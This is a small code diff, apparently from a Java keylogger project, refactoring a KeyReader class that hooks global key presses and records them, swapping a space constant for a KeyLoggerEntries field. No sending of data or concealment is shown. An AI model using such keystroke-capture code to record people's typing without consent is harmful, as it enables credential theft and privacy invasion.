@@ -10,9 +10,7 @@ import java.util.List;
 
 public class KeyReader implements NativeKeyListener {
 
-    private final static String SPACE = " ";
     private List<String> readSigns;
-
     public KeyReader() {
         readSigns = new ArrayList<>();
     }
@@ -45,7 +43,7 @@ public class KeyReader implements NativeKeyListener {
         if (keyPressed) {
 
             if (isSpace(keyText)) {
-                keyText = SPACE;
+                keyText = KeyLoggerEntries.SIGN_SPACE;
             }
 
             if (isShift(keyText)) {
@@ -63,7 +61,7 @@ public class KeyReader implements NativeKeyListener {
     }
 
     private String generateShiftEntry(String entry) {
-        return SPACE + entry + SPACE;
+        return  new StringBuilder().append(KeyLoggerEntries.SIGN_SPACE).append(entry).append(KeyLoggerEntries.SIGN_SPACE).toString();
     }
 
     private boolean isSpace(String keyText) {
